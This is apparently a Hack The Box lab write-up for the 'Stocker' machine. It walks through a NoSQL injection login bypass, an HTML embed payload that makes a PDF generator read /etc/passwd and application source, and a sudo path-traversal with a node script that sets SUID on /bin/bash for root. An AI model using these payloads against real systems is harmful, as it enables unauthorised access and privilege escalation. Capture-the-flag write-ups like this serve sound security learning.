# HTB - Stocker

## Summary

This was a pretty easy box. The web exploitation is actually the hard part of this one, the privesc is very easy. First we need to bypass a nosql login page with injection. Then, we do some Server Side Template Injection on a pdf generation request to have the resulting downloaded pdf contain files from the machine. This allows us to leak a user's password. Then, we just abuse a sudo command to get root.  

<br />

## Enumeration and nosql Login Bypass

nmap shows port 22 and 80 open, and tells us that there is a redirect to `stocker.htb` on 80. Add that to `/etc/hosts`  

We can bust subdomains with:  
`gobuster vhost -u http://stocker.htb/ -w /usr/share/wordlists/dnsmap.txt`  
and we find `dev.stocker.htb` add it to `/etc/hosts` and go there  

Its a login form. Its not vulnerable to sql injection but it is vulnerable to nosql injection. To do this, we send a request to burp, change the content type to `application/json` and then change the content to the following:  
Nosql injection, basic login bypass:  
`{"username": {"$ne": null}, "password": {"$ne":null}}`  
(See more here: https://book.hacktricks.xyz/pentesting-web/nosql-injection)  

<br />

## PDF SSTI

This gets us to a page which lets us add items to a cart and checkout. When we checkout, we can download a pdf receipt.  

Intercepting the checkout request, we can see the pdf generation request as part of the payload. We can modify the fields, and change the item field to the following:  
`<embed type='text/html' src='file:///etc/passwd' width=1000px height=1000px>`  

The resulting pdf contains the contents of `/etc/passwd`  

Grabbing `/var/www/dev/index.js` is ultimately what allows us to get an ssh shell as the user angoose, because the password is written in plaintext there (`IHeardPassphrasesArePrettySecure`)  

<br />

## Privesc

`sudo -l` shows us:  
`(ALL) /usr/bin/node /usr/local/scripts/*.js`  

Using this, we will be able to get a shell as root:  

create a node-runnable js file with the contents:  
```javascript
const { exec } = require('node:child_process');

exec('chmod u+s /bin/bash', (err, output) => {
    if (err) {
        console.error("could not execute command: ", err);
        return;
    }
    console.log("output: ", output);
})
```

We don't have write permissions to the directory `/usr/local/scripts` but this actually doesn't matter. Just put the escalation script in `/tmp` and run:  
`sudo /usr/bin/node /usr/local/scripts/../../../tmp/privesc.js`  

And we are good  
Now `/bin/bash` has the suid bit, so running `/bin/bash -p` gets us a root shell  

